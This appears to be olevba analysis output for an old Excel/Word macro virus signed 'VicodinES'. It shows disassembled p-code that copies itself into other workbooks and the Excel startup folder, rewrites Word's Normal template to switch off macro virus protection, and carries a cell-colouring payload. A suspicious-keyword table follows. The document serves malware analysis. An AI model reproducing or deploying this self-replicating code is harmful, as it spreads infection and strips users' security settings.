' 	LitStr 0x0010 "Word.Application"
' 	ArgsLd GetObject 0x0002 
' 	Set WordObj 
' Line #68:
' 	Ld WordObj 
' 	LitStr 0x0000 ""
' 	Eq 
' 	IfBlock 
' Line #69:
' 	SetStmt 
' 	LitStr 0x0010 "Word.Application"
' 	ArgsLd CreateObject 0x0001 
' 	Set WordObj 
' Line #70:
' 	LitVarSpecial (True)
' 	St Quit 
' Line #71:
' 	EndIfBlock 
' Line #72:
' 	SetStmt 
' 	LitStr 0x000C "ThisDocument"
' 	Ld WordObj 
' 	MemLd NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set NT 
' Line #73:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NT 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0004 "'Vic"
' 	FnInStr3 
' 	IfBlock 
' Line #74:
' 	LitStr 0x001C "Normal.ThisDocument.AutoExec"
' 	Ld WordObj 
' 	ArgsMemCall Run 0x0001 
' Line #75:
' 	ElseBlock 
' Line #76:
' 	LitVarSpecial (False)
' 	Ld WordObj 
' 	MemLd Options 
' 	MemSt SaveNormalPrompt 
' Line #77:
' 	LitDI2 0x0001 
' 	Ld NT 
' 	MemLd CountOfLines 
' 	Ld NT 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #78:
' 	LitDI2 0x0001 
' 	LitStr 0x0013 "Sub AutoExec() 'Vic"
' 	Ld NT 
' 	ArgsMemCall InsertLines 0x0002 
' Line #79:
' 	LitDI2 0x0002 
' 	LitStr 0x0043 "System.ProfileString("Options", "EnableMacroVirusProtection") = "0""
' 	Ld NT 
' 	ArgsMemCall InsertLines 0x0002 
' Line #80:
' 	LitDI2 0x0003 
' 	LitStr 0x0079 "System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel", "Options6") = """
' 	Ld NT 
' 	ArgsMemCall InsertLines 0x0002 
' Line #81:
' 	LitDI2 0x0004 
' 	LitStr 0x008C "System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Office\8.0\New User Settings\Excel\Microsoft Excel", "Options6") = """
' 	Ld NT 
' 	ArgsMemCall InsertLines 0x0002 
' Line #82:
' 	LitDI2 0x0005 
' 	LitStr 0x0007 "End Sub"
' 	Ld NT 
' 	ArgsMemCall InsertLines 0x0002 
' Line #83:
' 	LitStr 0x001C "Normal.ThisDocument.AutoExec"
' 	Ld WordObj 
' 	ArgsMemCall Run 0x0001 
' Line #84:
' 	EndIfBlock 
' Line #85:
' 	SetStmt 
' 	LitNothing 
' 	Set NT 
' Line #86:
' 	Ld Quit 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld WordObj 
' 	ArgsMemCall Quit 0x0000 
' 	EndIf 
' Line #87:
' 	EndSub 
' _VBA_PROJECT_CUR/VBA/Sheet16 - 7941 bytes
' Line #0:
' 	Dim (Public) 
' 	VarDefn run1
' 	VarDefn didvic (As Boolean)
' Line #1:
' 	FuncDefn (Private Sub Worksheet_Activate())
' Line #2:
' 	OnError (Resume Next) 
' Line #3:
' 	ArgsCall Read 0x0000 
' Line #4:
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	Ld Now 
' 	ArgsLd Minute 0x0001 
' 	Eq 
' 	IfBlock 
' Line #5:
' 	StartForVariable 
' 	Ld y 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x000A 
' 	For 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x001E 
' 	For 
' Line #6:
' 	LitDI2 0x0040 
' 	Ld y 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Ld x 
' 	Concat 
' 	St rng 
' Line #7:
' 	Ld rng 
' 	ArgsLd Range 0x0001 
' 	ArgsMemCall Set 0x0000 
' Line #8:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Interior 
' 	With 
' Line #9:
' 	Ld Rnd 
' 	LitDI2 0x0032 
' 	Mul 
' 	FnInt 
' 	Paren 
' 	MemStWith ColorIndex 
' Line #10:
' 	Ld xlSolid 
' 	MemStWith Pattern 
' Line #11:
' 	EndWith 
' Line #12:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Ld y 
' 	EndForVariable 
' 	NextVar 
' Line #13:
' 	EndIfBlock 
' Line #14:
' 	LitStr 0x0003 "c:\"
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	ArgsLd Dir 0x0001 
' 	ArgsLd UCase 0x0001 
' 	Ld Application 
' 	MemLd UserName 
' 	ArgsLd UCase 0x0001 
' 	Ne 
' 	IfBlock 
' Line #15:
' 	LitStr 0x0003 "c:\"
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	LitStr 0x000C "ThisWorkbook"
' 	Ld ActiveWorkbook 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #16:
' 	EndIfBlock 
' Line #17:
' 	Ld vbCr 
' 	St v1 
' Line #18:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Workbooks 
' 	MemLd Count 
' 	For 
' Line #19:
' 	LitStr 0x000C "ThisWorkbook"
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St WeIn 
' Line #20:
' 	Ld WeIn 
' 	LitDI2 0x0000 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0003 
' 	Ld WeIn 
' 	LitDI2 0x0002 
' 	Sub 
' 	Paren 
' 	LitStr 0x000C "ThisWorkbook"
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St VCode 
' 	EndIf 
' Line #21:
' 	Ld VCode 
' 	FnLen 
' 	LitDI2 0x0BB8 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	GoTo out 
' 	EndIf 
' Line #22:
' 	StartForVariable 
' 	Ld yz 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #23:
' 	Ld yz 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St Weins1 
' Line #24:
' 	Ld yz 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd TypeOf 
' 	LitDI2 0x0064 
' 	Eq 
' 	IfBlock 
' Line #25:
' 	Ld Weins1 
' 	LitDI2 0x0000 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0003 
' 	Ld Weins1 
' 	LitDI2 0x0002 
' 	Sub 
' 	Paren 
' 	Ld yz 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St VCode 
' 	EndIf 
' Line #26:
' 	Ld VCode 
' 	FnLen 
' 	LitDI2 0x0BB8 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	GoTo out 
' 	EndIf 
' Line #27:
' 	EndIfBlock 
' Line #28:
' 	StartForVariable 
' 	Ld yz 
' 	EndForVariable 
' 	NextVar 
' Line #29:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #30:
' 	Label out 
' Line #31:
' 	Ld Application 
' 	MemLd StartupPath 
' 	LitStr 0x0007 "\Book1."
' 	Add 
' 	ArgsLd Dir 0x0001 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x0005 "Book1"
' 	ArgsLd UCase 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St PXLS 
' 	EndIf 
' Line #32:
' 	Ld PXLS 
' 	LitVarSpecial (False)
' 	Eq 
' 	Ld run1 
' 	LitVarSpecial (True)
' 	Ne 
' 	And 
' 	IfBlock 
' Line #33:
' 	LitVarSpecial (True)
' 	St run1 
' Line #34:
' 	Ld Application 
' 	MemLd StartupPath 
' 	LitStr 0x0007 "\Book1."
' 	Concat 
' 	ParamNamed FileName 
' 	Ld xlNormal 
' 	ParamNamed FileFormat 
' 	LitVarSpecial (False)
' 	ParamNamed AddToMru 
' 	Ld Workbooks 
' 	MemLd Add 
' 	ArgsMemCall SaveAs 0x0003 
' Line #35:
' 	EndIfBlock 
' Line #36:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Workbooks 
' 	MemLd Count 
' 	For 
' Line #37:
' 	LitStr 0x000C "ThisWorkbook"
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St WeIn 
' Line #38:
' 	Ld WeIn 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #39:
' 	LitStr 0x001E "Public run1, didvic As Boolean"
' 	Ld v1 
' 	Concat 
' 	LitStr 0x003F "Private Sub Workbook_WindowDeactivate(ByVal Wn As Excel.Window)"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	Ld VCode 
' 	Concat 
' 	Paren 
' 	LitStr 0x000C "ThisWorkbook"
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #40:
' 	EndIfBlock 
' Line #41:
' 	StartForVariable 
' 	Ld yy 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #42:
' 	Ld yy 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St Weins1 
' Line #43:
' 	Ld Weins1 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #44:
' 	Ld yy 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd TypeOf 
' 	LitDI2 0x0064 
' 	Eq 
' 	IfBlock 
' Line #45:
' 	LitStr 0x001E "Public run1, didvic As Boolean"
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0020 "Private Sub Worksheet_Activate()"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	Ld VCode 
' 	Concat 
' 	Paren 
' 	Ld yy 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #46:
' 	Ld Weins1 
' 	LitDI2 0x0001 
' 	Ld yy 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #47:
' 	EndIfBlock 
' Line #48:
' 	EndIfBlock 
' Line #49:
' 	Ld yy 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd TypeOf 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #50:
' 	Ld Weins1 
' 	Paren 
' 	LitDI2 0x0018 
' 	Ld yy 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St findvic 
' Line #51:
' 	LitDI2 0x0001 
' 	Ld findvic 
' 	LitStr 0x0009 "VicodinES"
' 	FnInStr3 
' 	LitDI2 0x0002 
' 	Ne 
' 	Ld didvic 
' 	LitVarSpecial (True)
' 	Ne 
' 	And 
' 	IfBlock 
' Line #52:
' 	Ld Weins1 
' 	LitDI2 0x0001 
' 	Add 
' 	Paren 
' 	LitStr 0x0018 "Private Sub Auto_Close()"
' 	Ld v1 
' 	Concat 
' 	LitStr 0x001C "For x = 1 To Workbooks.Count"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0037 "For yz = 1 To Workbooks(x).VBProject.VBComponents.Count"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x004D "Weins1 = Workbooks(x).VBProject.VBComponents.Item(yz).CodeModule.CountOfLines"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x003F "If Workbooks(x).VBProject.VBComponents.Item(yz).Type = 100 Then"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x001F "If Weins1 > 30 Then OKEY = True"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0006 "End If"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0007 "Next yz"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0006 "Next x"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0014 "If OKEY <> True Then"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x004E "If UCase(Dir("c:\" & Application.UserName)) = UCase(Application.UserName) Then"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x007A "Workbooks(Workbooks.Count).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.AddFromFile "c:\" & Application.UserName"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0062 "Workbooks(Workbooks.Count).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.DeleteLines 1, 4"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0004 "Else"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x004C "MsgBox "Why Did You Remove Sugar.Poppy?", vbQuestion, "VicodinES wonders...""
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0006 "End If"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0006 "End If"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0007 "End Sub"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x000A "'VicodinES"
' 	Concat 
' 	Ld yy 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #53:
' 	LitVarSpecial (True)
' 	St didvic 
' Line #54:
' 	ElseBlock 
' Line #55:
' 	LitVarSpecial (True)
' 	St didvic 
' Line #56:
' 	EndIfBlock 
' Line #57:
' 	EndIfBlock 
' Line #58:
' 	StartForVariable 
' 	Ld yy 
' 	EndForVariable 
' 	NextVar 
' Line #59:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #60:
' 	Ld PXLS 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #61:
' 	ArgsCall (Call) AbuseWord 0x0000 
' Line #62:
' 	LitVarSpecial (True)
' 	ParamNamed SaveChanges 
' 	LitStr 0x0006 "Book1."
' 	ArgsLd Workbooks 0x0001 
' 	ArgsMemCall Close 0x0001 
' Line #63:
' 	EndIfBlock 
' Line #64:
' 	EndSub 
' Line #65:
' 	FuncDefn (Private Sub AbuseWord())
' Line #66:
' 	OnError (Resume Next) 
' Line #67:
' 	SetStmt 
' 	ParamOmitted 
' 	LitStr 0x0010 "Word.Application"
' 	ArgsLd GetObject 0x0002 
' 	Set WordObj 
' Line #68:
' 	Ld WordObj 
' 	LitStr 0x0000 ""
' 	Eq 
' 	IfBlock 
' Line #69:
' 	SetStmt 
' 	LitStr 0x0010 "Word.Application"
' 	ArgsLd CreateObject 0x0001 
' 	Set WordObj 
' Line #70:
' 	LitVarSpecial (True)
' 	St Quit 
' Line #71:
' 	EndIfBlock 
' Line #72:
' 	SetStmt 
' 	LitStr 0x000C "ThisDocument"
' 	Ld WordObj 
' 	MemLd NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set NT 
' Line #73:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NT 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0004 "'Vic"
' 	FnInStr3 
' 	IfBlock 
' Line #74:
' 	LitStr 0x001C "Normal.ThisDocument.AutoExec"
' 	Ld WordObj 
' 	ArgsMemCall Run 0x0001 
' Line #75:
' 	ElseBlock 
' Line #76:
' 	LitVarSpecial (False)
' 	Ld WordObj 
' 	MemLd Options 
' 	MemSt SaveNormalPrompt 
' Line #77:
' 	LitDI2 0x0001 
' 	Ld NT 
' 	MemLd CountOfLines 
' 	Ld NT 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #78:
' 	LitDI2 0x0001 
' 	LitStr 0x0013 "Sub AutoExec() 'Vic"
' 	Ld NT 
' 	ArgsMemCall InsertLines 0x0002 
' Line #79:
' 	LitDI2 0x0002 
' 	LitStr 0x0043 "System.ProfileString("Options", "EnableMacroVirusProtection") = "0""
' 	Ld NT 
' 	ArgsMemCall InsertLines 0x0002 
' Line #80:
' 	LitDI2 0x0003 
' 	LitStr 0x0079 "System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel", "Options6") = """
' 	Ld NT 
' 	ArgsMemCall InsertLines 0x0002 
' Line #81:
' 	LitDI2 0x0004 
' 	LitStr 0x008C "System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Office\8.0\New User Settings\Excel\Microsoft Excel", "Options6") = """
' 	Ld NT 
' 	ArgsMemCall InsertLines 0x0002 
' Line #82:
' 	LitDI2 0x0005 
' 	LitStr 0x0007 "End Sub"
' 	Ld NT 
' 	ArgsMemCall InsertLines 0x0002 
' Line #83:
' 	LitStr 0x001C "Normal.ThisDocument.AutoExec"
' 	Ld WordObj 
' 	ArgsMemCall Run 0x0001 
' Line #84:
' 	EndIfBlock 
' Line #85:
' 	SetStmt 
' 	LitNothing 
' 	Set NT 
' Line #86:
' 	Ld Quit 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld WordObj 
' 	ArgsMemCall Quit 0x0000 
' 	EndIf 
' Line #87:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |Auto_Close          |Runs when the Excel Workbook is closed       |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|GetObject           |May get an OLE object with a running instance|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

